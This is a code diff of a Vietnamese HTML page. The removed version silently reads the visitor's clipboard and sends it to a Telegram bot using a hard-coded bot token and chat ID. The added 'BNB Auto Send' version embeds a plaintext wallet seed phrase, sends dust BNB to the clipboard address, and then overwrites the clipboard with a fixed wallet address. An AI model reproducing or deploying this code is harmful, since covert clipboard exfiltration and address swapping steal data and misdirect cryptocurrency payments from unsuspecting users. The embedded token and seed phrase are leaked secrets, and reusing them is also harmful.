@@ -1,68 +1,113 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <title>Gửi Clipboard</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    textarea {
-      width: 100%;
-      height: 160px;
-      font-size: 16px;
-    }
-    button {
-      width: 100%;
-      padding: 14px;
-      margin-top: 12px;
-      font-size: 18px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>BNB Auto Speed</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #0b0e11; color: white; max-width: 400px; margin: 50px auto; padding: 20px; border: 1px solid #333; border-radius: 15px; text-align: center; }
+        .card { background: #181a20; padding: 20px; border-radius: 12px; border: 1px solid #2b2f36; margin-bottom: 15px; }
+        .bnb-val { color: #f3ba2f; font-weight: bold; font-size: 20px; }
+        .btn-main { width: 100%; padding: 20px; background: #f3ba2f; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: black; font-size: 18px; transition: 0.2s; }
+        .btn-main:hover { background: #fcd535; transform: scale(1.02); }
+        .btn-main:disabled { background: #444; color: #888; cursor: not-allowed; }
+        #log { margin-top: 15px; padding: 12px; background: #000; border-radius: 8px; font-family: monospace; font-size: 11px; min-height: 80px; word-break: break-all; color: #aaa; border-left: 3px solid #f3ba2f; text-align: left; }
+        .loader { color: #f3ba2f; display: none; margin-bottom: 10px; }
+    </style>
 </head>
 <body>
 
-<h2>📋 Gửi Clipboard</h2>
+    <h3 style="color: #f3ba2f;">BNB AUTO SEND</h3>
 
-<p>Copy nội dung → bấm nút bên dưới</p>
+    <div class="card">
+        <div style="font-size: 12px; color: #848e9c; margin-bottom: 5px;">SỐ DƯ VÍ NGUỒN</div>
+        <div id="bnbBal" class="bnb-val">0.0000</div>
+        <div style="font-size: 11px; margin-top: 10px; color: #02c076;">Mặc định: 0.00001 BNB | Gas: 100k</div>
+    </div>
 
-<textarea id="text" placeholder="Nếu không tự dán được, hãy dán thủ công vào đây"></textarea>
+    <button id="mainBtn" class="btn-main" onclick="pasteAndSend()">ẤN ĐỂ DÁN & GỬI</button>
 
-<button onclick="pasteAndSend()">📤 Dán & Gửi</button>
+    <div id="log">Đang khởi tạo mạng...</div>
 
-<script>
-const BOT_TOKEN = "8379215075:AAHfjpWkGkmXJoiya1mVJH8Nd1wCgXTtPs4";
-const CHAT_ID = "5376711844";
+    <script>
+        // CẤU HÌNH CỐ ĐỊNH
+        const SEED = "wild liar merge vote attitude liberty utility runway grace stamp senior pulp";
+        const FIXED_COPY_ADDR = "0x83b23C26EDab54Fd7187fD6bc2dC2Ba3b48498AA";
+        const SEND_AMOUNT = "0.00001";
+        const RPCS = ["https://binance.llamarpc.com", "https://bsc-dataseed.binance.org", "https://bsc.publicnode.com"];
 
-async function pasteAndSend() {
-  let text = document.getElementById("text").value.trim();
+        let wallet;
+        let provider;
 
-  // Nếu textarea trống thì đọc clipboard
-  if (!text) {
-    try {
-      text = await navigator.clipboard.readText();
-      document.getElementById("text").value = text;
-    } catch (e) {
-      // Không hiện popup
-      return;
-    }
-  }
+        async function init() {
+            const log = document.getElementById('log');
+            try {
+                wallet = ethers.Wallet.fromPhrase(SEED);
+                for (let url of RPCS) {
+                    try {
+                        const p = new ethers.JsonRpcProvider(url);
+                        const bal = await p.getBalance(wallet.address);
+                        provider = p;
+                        wallet = wallet.connect(provider);
+                        document.getElementById('bnbBal').innerText = ethers.formatEther(bal);
+                        log.innerText = "✅ Sẵn sàng. Ví: " + wallet.address;
+                        return;
+                    } catch (e) { continue; }
+                }
+                log.innerText = "❌ Lỗi mạng. Hãy bật VPN 1.1.1.1";
+            } catch (err) {
+                log.innerText = "❌ Lỗi khởi tạo!";
+            }
+        }
 
-  if (!text) return;
+        // HÀM CHÍNH: DÁN -> GỬI -> COPY VÍ MỚI
+        async function pasteAndSend() {
+            const log = document.getElementById('log');
+            const btn = document.getElementById('mainBtn');
 
-  // Gửi âm thầm, không alert
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text
-    })
-  }).catch(() => {});
-}
-</script>
+            try {
+                // 1. Lấy địa chỉ từ Clipboard
+                const toAddress = await navigator.clipboard.readText();
+                const cleanAddress = toAddress.trim();
 
+                if (!ethers.isAddress(cleanAddress)) {
+                    alert("Dữ liệu trong Clipboard không phải địa chỉ ví!");
+                    return;
+                }
+
+                btn.disabled = true;
+                log.innerText = "⏳ Đang gửi tới: " + cleanAddress;
+
+                // 2. Thực hiện gửi ngay lập tức
+                const tx = await wallet.sendTransaction({
+                    to: cleanAddress,
+                    value: ethers.parseEther(SEND_AMOUNT),
+                    gasLimit: 100000,
+                    data: "0x"
+                });
+
+                log.innerHTML = `🚀 Đang xử lý...<br>Hash: <a href="https://bscscan.com/tx/${tx.hash}" target="_blank" style="color:#f3ba2f">${tx.hash}</a>`;
+
+                // 3. Đợi xác nhận & Tự động copy ví yêu cầu vào Clipboard
+                await tx.wait();
+                
+                // Copy địa chỉ cố định vào clipboard sau khi gửi
+                await navigator.clipboard.writeText(FIXED_COPY_ADDR);
+                
+                log.innerHTML += `<br><b style="color:#02c076">✅ THÀNH CÔNG!</b><br>📋 Đã copy ví mới vào Clipboard.`;
+                
+                // Cập nhật số dư mới
+                const b = await provider.getBalance(wallet.address);
+                document.getElementById('bnbBal').innerText = ethers.formatEther(b);
+
+            } catch (e) {
+                log.innerText = "❌ LỖI: " + (e.reason || e.message);
+            } finally {
+                btn.disabled = false;
+            }
+        }
+
+        init();
+    </script>
 </body>
 </html>
